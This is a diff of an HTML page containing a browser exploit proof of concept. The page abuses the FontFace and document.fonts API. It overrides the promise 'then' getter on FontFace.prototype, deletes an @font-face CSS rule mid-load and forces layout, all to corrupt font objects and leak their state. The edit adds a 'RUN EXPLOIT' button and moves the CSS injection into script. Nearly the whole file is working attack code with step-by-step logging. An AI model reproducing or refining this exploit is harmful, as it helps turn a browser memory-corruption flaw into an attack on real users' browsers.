@@ -1,108 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-<style id="s">
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-</style>
+<!-- NO CSS HERE - we'll inject it with JavaScript -->
 </head>
 <body>
-<h1>Loading exploit...</h1>
-<div id="log" style="font-family: monospace; font-size: 13px; white-space: pre; border: 1px solid white; padding: 10px; margin: 10px;"></div>
+<h1 id="status">Ready - Click button to trigger exploit</h1>
+<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
+<div id="log" style="font-family: monospace; font-size: 12px; white-space: pre; border: 1px solid white; padding: 10px; margin: 10px;"></div>
+
 <script>
-// Prevent multiple execution
-if (!window.exploitRan) {
-    window.exploitRan = true;
+function log(msg) {
+    let d = document.getElementById('log');
+    if (d) d.textContent += msg + '\n';
+}
+
+function runExploit() {
+    document.getElementById('status').textContent = 'Exploit running...';
+    log('[*] Starting exploit at ' + Date.now());
     
-    let logBuffer = [];
-    function log(msg) {
-        logBuffer.push(msg);
-        let d = document.getElementById('log');
-        if (d) {
-            d.textContent = logBuffer.join('\n');
-        }
-    }
-    
-    log('[*] Exploit starting...');
-    log('[*] Time: ' + Date.now());
-    
-    // Wrap everything in try-catch
     try {
+        // Step 1: Inject the CSS dynamically
+        log('[1] Creating style element...');
+        let style = document.createElement('style');
+        style.id = 's';
+        style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        
+        log('[2] Appending style to head...');
+        document.head.appendChild(style);
+        log('    Style appended - CSS now active');
+        
+        // Step 2: Set up the exploit
+        log('[3] Creating FontFace A...');
         let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        log('[1] Created FontFace A');
         
+        log('[4] Adding to document.fonts...');
         document.fonts.add(A);
-        log('[2] Added A to document.fonts');
         
+        log('[5] Accessing A.loaded...');
         void A.loaded;
-        log('[3] Accessed A.loaded');
         
-        let getterCallCount = 0;
         let fired = false;
         
+        log('[6] Installing malicious getter...');
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                getterCallCount++;
-                log('[GETTER] Called ' + getterCallCount + ' time(s)');
-                
                 if (!fired && this === A) {
                     fired = true;
-                    log('[GETTER] First valid call - executing exploit');
+                    log('[GETTER] Executing corruption...');
+                    
+                    let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                    let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                    
+                    log('[GETTER] Deleting CSS...');
+                    document.getElementById('s').sheet.deleteRule(0);
+                    
+                    log('[GETTER] Forcing layout...');
+                    document.body.offsetTop;
+                    
+                    log('[GETTER] Corruption done! Attempting leak...');
+                    
+                    // EXPLOIT HERE - before returning
+                    log('[LEAK] y.status: ' + y.status);
+                    log('[LEAK] y.family: ' + y.family);
+                    log('[LEAK] typeof y.loaded: ' + typeof y.loaded);
+                    log('[LEAK] y.loaded: ' + y.loaded);
                     
                     try {
-                        log('[GETTER] Creating y...');
-                        let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                        log('[GETTER] y created');
-                        
-                        log('[GETTER] Creating z...');
-                        let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                        log('[GETTER] z created');
-                        
-                        log('[GETTER] Deleting CSS rule...');
-                        document.getElementById('s').sheet.deleteRule(0);
-                        log('[GETTER] CSS deleted');
-                        
-                        log('[GETTER] Forcing layout...');
-                        let offset = document.body.offsetTop;
-                        log('[GETTER] offsetTop = ' + offset);
-                        
-                        log('[GETTER] Corruption complete!');
-                        
-                        // Quick exploitation before return
-                        log('[EXPLOIT] y.status: ' + y.status);
-                        log('[EXPLOIT] z.status: ' + z.status);
-                        log('[EXPLOIT] y.family: ' + y.family);
-                        
+                        let str = y.loaded.toString();
+                        log('[LEAK] y.loaded.toString(): ' + str);
                     } catch(e) {
-                        log('[GETTER] ERROR: ' + e.message);
+                        log('[LEAK] toString error: ' + e.message);
                     }
                     
-                    log('[GETTER] About to return undefined (OOM may happen)');
-                } else {
-                    log('[GETTER] Skipped (fired=' + fired + ', correct_this=' + (this === A) + ')');
+                    log('[GETTER] Returning undefined - OOM may trigger now');
                 }
-                
                 return undefined;
             }
         });
         
-        log('[4] Installed getter');
-        log('[5] Calling fonts.load()...');
-        
+        log('[7] Calling fonts.load() - this should trigger OOM...');
         document.fonts.load('1em x', 'AB');
         
-        log('[6] fonts.load() returned (unexpected if OOM happens)');
+        log('[8] fonts.load returned (unexpected)');
         
     } catch(e) {
         log('[ERROR] ' + e.message);
-        log('[STACK] ' + e.stack);
     }
-    
-    log('[*] Script end');
-    
-} else {
-    document.getElementById('log').textContent = '[!] Exploit already ran - prevented re-execution';
 }
+
+log('Page loaded - ready to run exploit');
 </script>
 </body>
 </html>
